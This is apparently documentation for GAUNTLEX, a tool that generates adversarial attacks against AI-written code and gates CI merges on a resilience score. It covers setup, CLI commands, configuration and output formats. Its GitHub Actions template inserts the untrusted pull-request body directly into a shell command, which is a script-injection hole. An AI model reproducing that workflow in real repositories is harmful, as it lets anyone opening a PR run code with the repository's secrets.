A failed CI gate stops a merge but doesn't, by itself, notify a security team or create a tracking ticket. When ARS falls below `minimum_ars`, GAUNTLEX can dispatch a Slack attachment (top missed attacks, link to the report) and/or a Jira ticket (full attack details, CWE references, run ID). Both are best-effort — a notification failure never blocks the CI gate or report generation.

```bash
export SLACK_WEBHOOK_URL=https://hooks.slack.com/services/T.../B.../...
export JIRA_BASE_URL=https://your-org.atlassian.net
export JIRA_PROJECT=SEC
export JIRA_TOKEN=your-api-token
```

### Feature 13 — Domain Intelligence Adapter (Live Threat Intel)

Covered in full, including exactly what's live vs. static and how the two MCP relationships differ, in **[Domain Intelligence](DOMAIN_INTELLIGENCE.md)**.

### Feature 14 — Air-Gap / Full On-Premises Operation

For organizations where sending a specification to an external API is itself a compliance risk (PHI, defense, data sovereignty constraints): GAUNTLEX's entire engine runs offline using [Ollama](https://ollama.ai). No internet connection required. ChromaDB runs embedded — no external vector DB service needed.

```yaml
deployment:
  model_provider: local
  local_model: llama3.3:70b    # or llama3.1:8b, mistral:7b, codellama:34b
```

```bash
gauntlex doctor --strict
# ✅ Model:   llama3.3:70b (local Ollama, no outbound calls)
# ✅ Forge:   ChromaDB embedded at .gauntlex/forge/ (no external DB)
# ✅ Telemetry: NONE
```

```bash
docker compose up -d    # ChromaDB + GAUNTLEX + (optionally) Ollama, self-contained
```

---

## Installation

### pip

```bash
pip install gauntlex-ai                   # core engine (Ollama or API key)
pip install "gauntlex-ai[ui]"             # + GAUNTLEX Dashboard (FastAPI web UI)
```

### From source

```bash
git clone https://github.com/sanjoy1234/gauntlex.git
cd gauntlex
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
gauntlex doctor                           # verify all systems
```

### Docker Compose (full stack — ChromaDB included)

```bash
git clone https://github.com/sanjoy1234/gauntlex.git
cd gauntlex
docker compose up -d                      # ChromaDB + GAUNTLEX

docker compose run gauntlex \
  gauntlex run --issue /app/examples/demo_issue.md --mode quick

open http://localhost:8080                # GAUNTLEX Dashboard
```

---

## GitHub Actions — CI/CD Adversarial Gate

Don't hand-write this file — generate it so it never drifts from what
GAUNTLEX actually supports:

```bash
gauntlex integrate --platform github-actions
```

This writes exactly the following to `.github/workflows/gauntlex.yml`. Every
PR is adversarially tested before it can merge — zero changes to the
developer's workflow:

```yaml
name: GAUNTLEX Adversarial Gate
on:
  pull_request:
    branches: ["main", "master"]

jobs:
  gauntlex:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - name: Install GAUNTLEX
        run: pip install gauntlex-ai
      - name: Run adversarial assessment
        env:
          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
        run: |
          gauntlex run \
            --issue ${{ github.event.pull_request.body || 'examples/demo_issue.md' }} \
            --mode standard \
            --domain owasp_top10
      - name: Upload SARIF to GitHub Code Scanning
        if: always()
        uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: .gauntlex/reports/
```

> Set `OPENROUTER_API_KEY` as a repo secret matching whatever provider you
> configured via `gauntlex setup` — swap the env var name if you're on a
> different provider (e.g. `ANTHROPIC_API_KEY`). This template intentionally
> re-runs a fresh assessment in CI rather than reusing a local report, so
> the gate reflects the PR's actual diff.
> If `integrate` finds an existing `gauntlex.yml` that differs from this
> template — e.g. you've hand-added PR-comment posting or custom permissions
> — it leaves your file untouched and prints a warning rather than
> overwriting it. Pass `--force` if you genuinely want to reset it.

GAUNTLEX posts the ARS as a commit status. With `GITHUB_TOKEN` set, it also adds a PR comment with the full attack table. `fail_open: false` in `.gauntlex.yml` blocks the merge if ARS falls below the gate.

---

## GAUNTLEX in the Security Toolchain — Competitive Positioning

> *"We already have Snyk and Veracode. Does our enterprise really need another security tool?"*

A fair question. Before evaluating GAUNTLEX, it's worth understanding what each category of existing tool does — and the structural gap none of them close.

### What existing AppSec tools do — and what they cannot do

**Software Composition Analysis (SCA) — Snyk, Endor Labs, GHAS Dependabot.** Inventories your dependency graph and flags components with known CVEs. What they cannot do: test the code your team (or AI agent) wrote. If the vulnerability is in bespoke application code, not a dependency, SCA has nothing to say about it.

**Static Application Security Testing (SAST) — Veracode, Checkmarx, Semgrep, SonarQube, GitHub CodeQL.** Analyzes source code for patterns matching known vulnerability signatures — the closest existing category to what GAUNTLEX does. The fundamental limitation is structural: **SAST tests implementations.** It requires the code to exist. In the AI coding agent era it has three compounding limitations: (1) volume — AI agents generate features faster than nightly/weekly scan cycles, (2) novel patterns — SAST rules match known signatures, not new patterns AI models introduce, (3) anchoring to implementation — SAST cannot reason about what the code *should have defended against* based on the spec's implicit threat model, because there's no code pattern for an absence.

**Dynamic Application Security Testing (DAST) — StackHawk, OWASP ZAP, BurpSuite.** Probes a running application with adversarial HTTP requests. Requires a deployed, running application — operates entirely post-build and post-deployment, far downstream from the generation event.

**Human Penetration Testing.** Expert human pentesters provide the deepest and most creative adversarial coverage available — essential and irreplaceable. Typically quarterly or annual, $50,000–$200,000+ per engagement, against code that's been in production for months.

**AI Coding Assistants — GitHub Copilot, Cursor, Devin, SWE-agent, OpenHands.** Generate code. Do not adversarially test it. Have no mechanism for producing a security score on the code they generate.

### The gap none of them close

Every tool above shares one assumption: **the code already exists when security assessment begins.**

```
Traditional AppSec timeline:

 Spec  →  AI generates code  →  PR opens  →  SAST scan  →  Code review  →  Merge
                                                  ↑               ↑
                                      Post-generation       Post-generation

                                      DAST → Pentest → Incident response
                                           ↑              ↑
                                   Post-deployment    Post-breach
```

The gap is the **generation event itself** — the moment when spec intent becomes code, when trust assumptions are encoded, when the adversarial attack surface is created.

### Where GAUNTLEX fits — and where it doesn't

```
GAUNTLEX's position in the AppSec stack:

 Spec  →  [GAUNTLEX runs here: concurrent generation + adversarial attack]
              ARS score + Resilience Report + Forge Ledger entry
              SARIF output ready for Code Scanning before PR opens
              Hard gate blocks merge below threshold
              ↓
          PR opens  →  SAST (Semgrep/CodeQL)  →  Dependency check (Snyk)
                            ↓                          ↓
                     Periodic DAST           Periodic penetration test
```

**GAUNTLEX is not a replacement for SAST, SCA, DAST, or penetration testing.** These tools cover different surfaces with different techniques at different time horizons. GAUNTLEX adds the layer none of them provide: adversarial assessment at the generation event.

### Side-by-side comparison

| Capability | Snyk / SCA | Semgrep / SAST | DAST Tools | Pentest | AI Agents | **GAUNTLEX** |
|-----------|:---:|:---:|:---:|:---:|:---:|:---:|
| Tests at generation time (before commit) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Attacks from specification (not implementation) | ✗ | ✗ | ✗ | ⚠️ | ✗ | 🚀 |
| Adversarial reasoning (not pattern matching) | ✗ | ✗ | ⚠️ | ✅ | ✗ | 🚀 |
| Tamper-evident ARS (generation-time artifact) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Cross-build adversarial memory (Forge) | ✗ | ✗ | ✗ | ✗ | ✗ | 🚀 |
| Regulatory domain playbooks (HIPAA/FINRA/PCI) | ✗ | ⚠️ rules | ✗ | ✅ | ✗ | 🚀 |
| Hard CI/CD merge gate per ARS score | ✗ | ✅ | ✗ | ✗ | ✗ | ✅ |
| Air-gapped / on-premises (no cloud calls) | ⚠️ | ✅ | ✅ | ✅ | ⚠️ | ✅ Ollama |
| Supply chain / dependency analysis | 🚀 | ⚠️ | ✗ | ⚠️ | ✗ | ✗ |
| Full codebase scan (existing code) | ✅ | ✅ | ✅ | ✅ | ✗ | ✗ |
| Runtime/deployed application testing | ✗ | ✗ | 🚀 | ✅ | ✗ | ✗ |

🚀 = strongest in class &nbsp;·&nbsp; ✅ = capable &nbsp;·&nbsp; ⚠️ = partial &nbsp;·&nbsp; ✗ = not applicable

> **Honest scope note:** GAUNTLEX has narrower coverage than a full SAST tool. It tests a specific generation event — one spec, one run — not your entire existing codebase. Organizations need both: SAST for existing codebase coverage, GAUNTLEX for generation-time adversarial resilience in the AI coding agent workflow. The tools are complementary, not competing.

---

## How GAUNTLEX Works

### The Gauntlex

```python
# The entire engine in one conceptual line:
code, attacks = await asyncio.gather(builder.implement(spec), breaker.attack(spec))
```

- **Builder** — reads the spec, generates an implementation
- **Breaker** — reads the same spec, generates a stream of adversarial attacks rotating through CWEs selected for the detected language

### The Arbiter

```
ARS = Σ(attack_scores) / N

attack_score:
  1.0  mitigated  ── the generated code has a correct defense
  0.5  partial    ── some defense, but incomplete or bypassable
  0.0  missed     ── no defense; an attacker would succeed
```

The Arbiter also runs an entropy check: if all attacks cluster on the same CWE, it flags low diversity and schedules CWE rotation for the next run.

### The Full Execution Flow

```
gauntlex run --issue spec.md --mode standard --domain hipaa

 1. Load config (.gauntlex.yml)
 2. Fingerprint spec → language: "python", signals: [filesystem, async]
 3. Select language profile → priority CWEs
 4. Load policy domain → HIPAA scenarios
 5. Recall from Knowledge Forge → top effective past attacks for this fingerprint
 6. [Optional] DIA enrichment → live KEV/NVD/custom-MCP threat intel appended to policy context
 7. asyncio.gather(Builder.implement(spec), Breaker.attack(spec, context, recall))
 8. Arbiter.score(attacks) → ARS + SHA-256 integrity hash
 9. Write Forge Ledger entries for every attack
10. [Optional] Forge Network → push anonymized patterns to community hub
11. [Optional] Slack / Jira → notify if ARS < gate.minimum_ars
12. Exit 0 (PASS) or Exit 1 (FAIL) per gate config
```

---

## Complete CLI Reference

### `gauntlex setup` — configure model and integrations

```bash
gauntlex setup              # full wizard (first run or complete reconfigure)
gauntlex setup --model      # change AI provider or API key only
gauntlex setup --tokens     # refresh Jira / GitHub / Confluence tokens only
```

All credentials are written to `.env` — no file editing needed.

### `gauntlex init` — scaffold config

```bash
gauntlex init                     # scaffold .gauntlex.yml with defaults
gauntlex init --domain hipaa      # scaffold with a specific domain active
gauntlex init --force             # overwrite existing .gauntlex.yml
```

### `gauntlex doctor` — full health check

```bash
gauntlex doctor
# ✅ Config loaded            (.gauntlex.yml)
# ✅ Model reachable          (via configured provider)
# ✅ ChromaDB writable        (.gauntlex/forge/)
# ✅ Vault writable           (.gauntlex/vault/)
# ✅ Gate configured          (minimum_ars: 0.80, fail_open: false)
```

### `gauntlex validate` — dry run (zero cost, zero attacks)

```bash
gauntlex validate                   # checks env, config, AVF golden fixtures
gauntlex validate --strict          # also checks model connectivity
```

### `gauntlex run` — fire a Gauntlex

```bash
gauntlex run \
  --issue <spec>                    # file path or GitHub issue URL
  --mode quick|standard|thorough    # 5 / 20 / 50 attacks (default: quick)
  --domain <name>                   # policy domain (default: from .gauntlex.yml)
  --output-sarif <file>             # emit SARIF 2.1.0 for GitHub Code Scanning
  --output-junit <file>             # emit JUnit XML for CI dashboards
  --pretty                          # rich terminal output with color
  --config <path>                   # alternate config file
```

### `gauntlex status` — running and recent runs

```bash
gauntlex status              # recent 10 runs
gauntlex status --all        # all completed runs
```

### `gauntlex findings` — vulnerability findings, fix-first

```bash
gauntlex findings                    # last run
gauntlex findings <run_id>           # specific run
gauntlex findings --format md        # markdown output for PRs
```

### `gauntlex compare` — diff two runs

```bash
gauntlex compare <run_id_a> <run_id_b> --pretty
```

### `gauntlex learn` — feed a run into the Knowledge Forge

```bash
gauntlex learn <run_id> --pretty
```

Every `gauntlex run` now does this automatically on completion (best-effort —
writes to both the ChromaDB-backed Knowledge Forge and the Forge Ledger, so
`gauntlex vault` reflects real data with no extra step). Use the manual
command above to re-process an older run, or to backfill a report saved
before this became automatic.

### `gauntlex report` — render a Resilience Report

```bash
gauntlex report <run_id>                        # Markdown to stdout (default)
gauntlex report <run_id> --format html          # full HTML report
gauntlex report <run_id> --format sarif         # SARIF 2.1.0
gauntlex report <run_id> --format junit         # JUnit XML
gauntlex report <run_id> --format json          # raw JSON
```

### `gauntlex verify` — tamper detection

```bash
gauntlex verify <run_id>
# ✅ Integrity verified: sha256:... matches report
```

### `gauntlex audit` — compliance audit

```bash
gauntlex audit                    # last 90 days, all domains
gauntlex audit --days 30          # custom window
gauntlex audit --domain hipaa     # filter by policy domain
```

### `gauntlex vault` — browse the Forge Ledger

```bash
gauntlex vault --stats                          # aggregate stats
gauntlex vault --cwe CWE-89                     # filter by CWE
gauntlex vault --format md                      # Markdown table
```

### `gauntlex stats` — ARS trend analysis

```bash
gauntlex stats --days 30                        # 30-day ARS trend
gauntlex stats --learning-curve                 # Forge recall hit rate over time
gauntlex stats --by-cwe                         # breakdown by CWE category
```

### `gauntlex policy` — manage policy domains

```bash
gauntlex policy list                            # all available domains
gauntlex policy install owasp_api_security      # install from Policy Hub
gauntlex policy hub                             # browse all hub domains
gauntlex policy search fintech                  # search by tag or name
gauntlex policy validate <path-to-yaml>         # validate a custom domain's schema
```

### `gauntlex integrate` — one-command IDE/CI wiring

```bash
gauntlex integrate                        # configure everything
gauntlex integrate --platform claude-code
gauntlex integrate --platform github-actions
gauntlex integrate --dry-run              # preview changes without writing files
```

Platforms: `claude-code`, `cursor`, `windsurf`, `copilot`, `codex`, `zed`, `antigravity`, `github-actions`, `all`. Full detail on exact file paths and merge-safety guarantees: [Integrations guide](INTEGRATIONS.md).

### `gauntlex mcp-server` — MCP server, stdio transport

```bash
gauntlex mcp-server
```

Confirmed local IDE support: Claude Code, Cursor, Windsurf, Zed. See [Domain Intelligence](DOMAIN_INTELLIGENCE.md#gauntlex-as-an-mcp-server-vs-gauntlex-as-an-mcp-consumer).

### `gauntlex dashboard` — web UI

```bash
pip install "gauntlex-ai[ui]"
gauntlex dashboard --port 8080
# → http://localhost:8080
```

### `gauntlex serve` — CPaaS webhook server

```bash
gauntlex serve --port 8080 --rbac --host 0.0.0.0
# Required env: GITHUB_APP_ID, GITHUB_PRIVATE_KEY_PATH, GITHUB_WEBHOOK_SECRET
```

### `gauntlex leaderboard` — ARS agent leaderboard

```bash
gauntlex leaderboard                                   # from default reports dir
gauntlex leaderboard --jsonl scores.jsonl              # from JSONL file
gauntlex leaderboard --output docs/leaderboard.html    # GitHub Pages
```

### `gauntlex forge-network` — community pattern sharing

```bash
gauntlex forge-network status                   # opt-in status + hub stats
gauntlex forge-network pull CWE-89              # pull community SQL injection patterns
```

### `gauntlex prune` — housekeeping

```bash
gauntlex prune --older-than 90d                 # remove old reports
gauntlex prune --older-than 30d --dry-run       # preview
```

---

## Configuration Reference

`gauntlex init` scaffolds `.gauntlex.yml` with defaults. Every field is documented below.

```yaml
version: 1

# ── Provider ──────────────────────────────────────────────────────────────────
# 'local' = Ollama (free, air-gapped, on-prem)
# 'anthropic' = Anthropic API
# 'openrouter' = OpenRouter (access 50+ models)
deployment:
  model_provider: local
  local_model: llama3.1:8b
  anthropic_model: claude-haiku-4-5-20251001

# ── Gauntlex tuning ─────────────────────────────────────────────────────────
gauntlex:
  attack_count: 20            # 5=quick, 20=standard, 50=thorough
  rounds_max: 5               # max Arbiter re-evaluation rounds
  cwe_rotation: true          # rotate CWEs across runs for coverage breadth
  break_context_enabled: true # compress Breaker inputs (~40% token reduction)

# ── Adversarial Policy Engine ─────────────────────────────────────────────────
policy:
  domains:
    - owasp_top10@2025.1
    # - hipaa           # HIPAA PHI protection scenarios
    # - finra           # FINRA AML / broker-dealer scenarios
    # - pci_dss         # PCI-DSS CHD scope controls
    # - soc2            # SOC 2 Type II logical access controls

# ── ARS gate ─────────────────────────────────────────────────────────────────
# fail_open: false = exit(1) when ARS < minimum_ars → blocks CI merge
# fail_open: true  = warn only (advisory mode)
gate:
  minimum_ars: 0.80
  fail_open: false

# ── Knowledge Forge ───────────────────────────────────────────────────────────
forge:
  enabled: true
  max_recall: 10              # max past attacks recalled per run
  similarity_threshold: 0.75  # ChromaDB cosine similarity floor

# ── Notifications (low-ARS alerts) ───────────────────────────────────────────
# Set secrets as env vars, never in this file
notifications:
  slack_webhook: ""           # or: export SLACK_WEBHOOK_URL=https://hooks.slack.com/...
  jira_project: ""            # or: export JIRA_PROJECT=SEC JIRA_BASE_URL=... JIRA_TOKEN=...

# ── Live threat intel (MCP consumer) ─────────────────────────────────────────
mcp_servers: []
nvd_enabled: false             # or set NVD_API_KEY
kev_enabled: true               # default on
# Example custom server:
# mcp_servers:
#   - name: fin-intel
#     url: http://your-threat-intel-mcp-server:8090/mcp
#     tool: get_finra_threats
#     params: { sector: broker-dealer }
#     enabled: true

# ── Enterprise RBAC ───────────────────────────────────────────────────────────
# Set via env vars (not this file — team names are org-specific):
# GAUNTLEX_RBAC_ENABLED=true
# GITHUB_ORG=your-org
# GAUNTLEX_ADMIN_TEAMS=security-leads,platform-admin
# GAUNTLEX_REVIEWER_TEAMS=backend-leads,security-review
# GAUNTLEX_DEV_TEAMS=all-engineers    # default: any authenticated user
```

---

## Output Formats

### SARIF 2.1.0

```json
{
  "$schema": "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json",
  "version": "2.1.0",
  "runs": [{
    "tool": { "driver": { "name": "GAUNTLEX", "version": "1.0.0" } },
    "results": [{
      "ruleId": "CWE-79",
      "level": "error",
      "message": { "text": "Reflected XSS in error message — no output encoding applied" }
    }]
  }]
}
```

### JUnit XML

```xml
<testsuites name="GAUNTLEX" tests="5" failures="1">
  <testsuite name="Gauntlex">
    <testcase name="CWE-89: SQL Injection" classname="gauntlex.arbiter"/>
    <testcase name="CWE-79: Reflected XSS" classname="gauntlex.arbiter">
      <failure message="No output encoding — attacker controls error message body"/>
    </testcase>
  </testsuite>
</testsuites>
```

### Forge Ledger (Markdown Vault)

```markdown
---
cwe: CWE-79
attack_id: atk-001
severity: high
effectiveness: 0.0
verdict: missed
run_id: gauntlex-2026-06-28T12-00-00Z-a3f9
fingerprint: python-async-filesystem
recorded_at: 2026-06-28T12:01:43Z
---

## Attack: Reflected XSS in error message

No output encoding applied to user-controlled input in the error response path.
An attacker controlling the `username` parameter can inject `<script>` tags
into the 400 response body, which the browser executes in the victim's session.
```

---

## Enterprise Features

- **GAUNTLEX Dashboard** — see [Feature 8](#feature-8--gauntlex-dashboard) above.
- **CPaaS Mode** — `gauntlex serve` runs as a persistent GitHub App webhook server; every PR is adversarially tested automatically with zero developer workflow change. Requires `GITHUB_APP_ID`, `GITHUB_PRIVATE_KEY_PATH`, `GITHUB_WEBHOOK_SECRET`.
- **Enterprise RBAC** — see [Feature 10](#feature-10--enterprise-rbac-github-team-based-access-control) above.
- **Slack + Jira Alerts** — see [Feature 12](#feature-12--slack--jira-alerts-on-low-ars-runs) above.
- **Air-Gap / On-Premises** — see [Feature 14](#feature-14--air-gap--full-on-premises-operation) above.
- **MCP Server Integration** and **Domain Intelligence Adapter** — see [Domain Intelligence](DOMAIN_INTELLIGENCE.md).
- **ARS Leaderboard** — see [Feature 9](#feature-9--ars-leaderboard--benchmarking-ai-coding-agents) above.
- **Forge Network** — see [Feature 11](#feature-11--forge-network-opt-in-community-pattern-sharing) above.

---

## Testing

GAUNTLEX ships with 588 tests across all major components (`pytest --collect-only -q` to confirm the current count yourself). Test coverage is a first-class commitment.

```bash
pytest tests/ -q                                     # run the full suite
pytest tests/test_arbiter.py -v                       # specific module
pytest tests/ --cov=src/gauntlex --cov-report=html    # with coverage
```

| Test file | What it covers |
|-----------|---------------|
| `test_arbiter.py` | ARS formula, entropy checks, score parsing |
| `test_avf.py` | Golden fixtures, gate pass/fail, CWE matching |
| `test_break_context.py` | Token compression: target, recall, CWE context |
| `test_breaker.py` | CWE rotation, attack parsing, model response handling |
| `test_cli_commands.py` | CLI command wiring and output |
| `test_config.py` | YAML loading, defaults, field validation |
| `test_dashboard.py` | GAUNTLEX Dashboard HTML rendering, report loading |
| `test_dia.py` | MCP consumer: JSON-RPC call, error handling |
| `test_fingerprint.py` | Language detection, surface signals |
| `test_forge_bot.py` | Forge recall, deduplication, context construction |
| `test_forge_ledger.py` | Vault write/read, YAML frontmatter, stats |
| `test_forge_network.py` | Community push/pull, anonymization |
| `test_harness.py` | Hook chain execution |
| `test_intent_adapter.py` | Jira/Confluence/Aha! business-intent resolution |
| `test_kev_client.py` | CISA KEV fetch and CWE matching |
| `test_language_profiles.py` | Per-language CWE priority lists |
| `test_leaderboard.py` | ARS aggregation, rank score, JSONL loading |
| `test_live_progress.py` | Heartbeat/progress output during long model calls |
| `test_mcp_server.py` | GAUNTLEX-as-MCP-server tool exposure |
| `test_nvd_client.py` | NIST NVD query and CWE matching |
| `test_policy.py` | APE domain loading, user policy override |
| `test_policy_hub.py` | Hub fetch, install, search |
| `test_rbac.py` | GitHub team roles, TTL cache, network-error handling |
| `test_report.py` | SARIF, JUnit, HTML, tamper detection |
| `test_sprint6.py` | HIPAA/FINRA scenarios, Slack/Jira notifications |

---

## Development

### Setup

```bash
git clone https://github.com/sanjoy1234/gauntlex.git
cd gauntlex
python -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest tests/ -q          # verify: 588 passing
gauntlex doctor           # verify environment
```

### Claude Code Skills

This repository ships with seven Claude Code slash commands in `.claude/skills/gauntlex/` — productivity tools for contributors who use Claude Code. They do not affect GAUNTLEX's runtime behavior.

| Skill | What it does |
|-------|-------------|
| `/gauntlex:run` | Run a Gauntlex session on a spec |
| `/gauntlex:validate` | Dry-run health check |
| `/gauntlex:doctor` | Full environment diagnostics |
| `/gauntlex:report` | Render a Resilience Report in any format |
| `/gauntlex:learn` | Manually trigger Forge Ledger learning pass (automatic after every `gauntlex run`; use this to re-process an older run) |
| `/gauntlex:compare` | Compare two run ARS scores side-by-side |
| `/gauntlex:verify` | Verify report tamper-evidence |

If you don't use Claude Code, ignore the `.claude/` directory — it has no effect on the GAUNTLEX engine.

---

## Contributing

**New policy domains** — more regulatory frameworks. Copy `src/gauntlex/policy/domains/hipaa.yaml` and follow the schema (see [Domain Intelligence → Bring your own domain](DOMAIN_INTELLIGENCE.md#bring-your-own-domain)).

**Language profiles** — Rust, C++, Ruby, Swift. Add a profile to `src/gauntlex/brain/language_profiles.py` and extend `fingerprint_spec()` with detection signals.

**AVF golden fixtures** — adversarial test cases for known vulnerability classes, added to `tests/fixtures/` following the existing format.

**CI integrations** — GitLab CI, Azure DevOps, CircleCI, Bitbucket Pipelines YAML templates.

**Breaker templates** — richer attack descriptions per CWE, especially for emerging attack classes.

### Contribution workflow

```bash
# 1. Fork and clone
git clone https://github.com/your-username/gauntlex.git
cd gauntlex

# 2. Create a branch
git checkout -b feat/your-feature

# 3. Make changes + add tests
# Every new feature needs tests. See tests/ for patterns.

# 4. Verify
pytest tests/ -q         # all tests must pass
gauntlex validate        # dry-run must pass

# 5. Open a PR
# Title: feat(scope): short description
# Body: what, why, test evidence
```

Opening an issue tagged `[discussion]` before starting large features is appreciated.

---

## Roadmap

- [ ] **Rust + C++ language profiles** — systems language CWE patterns (CWE-416 use-after-free, CWE-787 OOB write, CWE-362 race)
- [ ] **GDPR domain playbook** — data minimization, right-to-erasure, consent tracking
- [ ] **FedRAMP domain playbook** — federal cloud compliance controls (FISMA High)
- [ ] **DORA domain playbook** — EU Digital Operational Resilience Act
- [ ] **GitLab CI / Azure DevOps templates** — one-file CI integration for non-GitHub shops
- [ ] **Streaming ARS** — real-time attack-by-attack scoring as Breaker fires; progress bar in CI
- [ ] **Forge Network public hub** — hosted community pattern sharing at scale
- [ ] **Multi-repo Forge** — shared adversarial memory across an organization's repositories
- [ ] **GAUNTLEX VS Code extension** — inline ARS feedback as you write specs in the editor

---

## FAQ

**Q: Does GAUNTLEX replace static analysis?**
No — it complements it. Bandit and Semgrep find known bad patterns fast. GAUNTLEX reasons adversarially about *your specific code* in *your specific business context*. Run both.

**Q: What does "concurrent" mean precisely?**
`asyncio.gather(builder_coroutine, breaker_coroutine)` — both coroutines start at the same instant against the same specification. The Breaker does not wait for generated code to exist; it attacks from the spec.

**Q: Can I run GAUNTLEX for free?**
Yes. The full engine runs on Ollama with no API cost. Attack quality scales with model capability — frontier models produce more sophisticated attacks — but the engine itself is free forever.

**Q: How long does a run take?**
Attack count targets 5/20/50 by mode (quick/standard/thorough) but isn't exact — actual totals depend on how many attacks the model returns per round; wall-clock time is not fixed either — it depends almost entirely on which model provider you configure, from single-digit seconds with a fast paid API to several minutes with a free-tier or local model. Run `gauntlex doctor` after setup to see what your specific configuration will look like in practice.

**Q: Is the ARS defensible to a security auditor?**
GAUNTLEX produces NIST SSDF, SOC 2, and ISO 27001 control mapping artifacts with a SHA-256 integrity hash. `gauntlex verify` re-derives the hash at any future audit, independent of GAUNTLEX itself.

**Q: What if the model goes down mid-run?**
GAUNTLEX fails the run cleanly — no partial report written. `fail_open: true` allows the pipeline to pass on model errors (useful during planned maintenance windows).

**Q: Can I contribute a new policy domain?**
Yes. Copy `src/gauntlex/policy/domains/hipaa.yaml`, follow the schema, add tests, open a PR. See [Domain Intelligence → Bring your own domain](DOMAIN_INTELLIGENCE.md#bring-your-own-domain).

**Q: What's the minimum ARS I should set for production?**
As a starting recommendation: begin at 0.75 (`fail_open: true`, advisory mode) for a couple of weeks to understand your baseline, then move to 0.80 (`fail_open: false`, blocking mode) once the team is calibrated. This is guidance, not a benchmark derived from measured customer deployments.

---

← [Back to README](../README.md) · [Domain Intelligence](DOMAIN_INTELLIGENCE.md)
